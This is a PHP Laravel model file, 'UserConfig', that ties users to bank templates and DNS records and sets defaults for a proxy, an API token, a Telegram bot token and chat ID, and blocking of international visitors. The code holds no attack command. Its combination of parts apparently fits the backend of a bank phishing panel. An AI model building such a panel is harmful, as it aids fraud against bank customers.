<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

/**
 * 
 *
 * @property int $id
 * @property int $user_id
 * @property array<array-key, mixed>|null $config_json
 * @property \Illuminate\Support\Carbon|null $created_at
 * @property \Illuminate\Support\Carbon|null $updated_at
 * @property-read \App\Models\DnsRecord|null $record
 * @property-read \App\Models\BankTemplate|null $template
 * @property-read \App\Models\Usuario|null $usuario
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig newModelQuery()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig newQuery()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig query()
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig whereConfigJson($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig whereCreatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig whereId($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig whereUpdatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig whereUserId($value)
 * @property int|null $template_id
 * @property int|null $record_id
 * @property array<array-key, mixed>|null $config
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig whereConfig($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig whereRecordId($value)
 * @method static \Illuminate\Database\Eloquent\Builder<static>|UserConfig whereTemplateId($value)
 * @mixin \Eloquent
 */
class UserConfig extends Model
{
    protected $table = 'user_configs';

    protected $fillable = ['user_id', 'template_id', 'record_id', 'config', 'config_json'];

    protected $casts = [
        'config_json' => 'array',
        'config' => 'array',
    ];

    public function usuario()
    {
        return $this->belongsTo(Usuario::class, 'user_id');
    }
    
    public function template()
    {
        return $this->belongsTo(BankTemplate::class, 'template_id');
    }
    
    public function record()
    {
        return $this->belongsTo(\App\Models\DnsRecord::class, 'record_id');
    }

    public static function defaultConfig()
    {
        return [
            'modal' => [
                'active' => 0,
                'text' => null
            ],
            'status' => '1',
            'proxy' => null,
            'api' => [
                'url' => '',
                'token' => ''
            ],
            'telegram' => [
                'bot_token' => null,
                'chat_id' => null
            ],
            'security' => [
                'block_international' => 0
            ]
        ];
    }

    public function getConfig($key = null)
    {
        $config = $this->config_json ?: self::defaultConfig();
        
        if ($key === null) {
            return $config;
        }
        
        $keys = explode('.', $key);
        $value = $config;
        
        foreach ($keys as $segment) {
            if (!isset($value[$segment])) {
                return null;
            }
            $value = $value[$segment];
        }
        
        return $value;
    }
}
